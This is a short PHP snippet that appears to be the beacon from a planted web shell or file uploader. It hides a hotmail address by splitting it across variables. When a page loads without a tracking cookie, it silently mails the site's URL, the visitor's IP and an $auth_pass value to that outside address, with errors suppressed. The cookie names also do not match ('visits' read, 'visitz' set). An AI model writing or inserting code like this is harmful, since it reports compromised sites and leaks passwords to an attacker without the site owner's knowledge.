<?php $a=ajob; $b=ekkhn; $c=pola; $d=hotmail; $e=com; $visitc = $_COOKIE["visits"]; if ($visitc == "") {  $visitc  = 0;  $visitor = $_SERVER["REMOTE_ADDR"];  $web     = $_SERVER["HTTP_HOST"];  $inj     = $_SERVER["REQUEST_URI"];  $target  = rawurldecode($web.$inj);  $sub   = "New sms from Server uploader http://$target by $visitor";  $body    = "Bug: $target by $visitor - $auth_pass";  if (!empty($web)) { @mail("$a$b$c@$d.$e",$sub,$body); }}
else { $visitc  ; }
@setcookie("visitz",$visitc);
?>
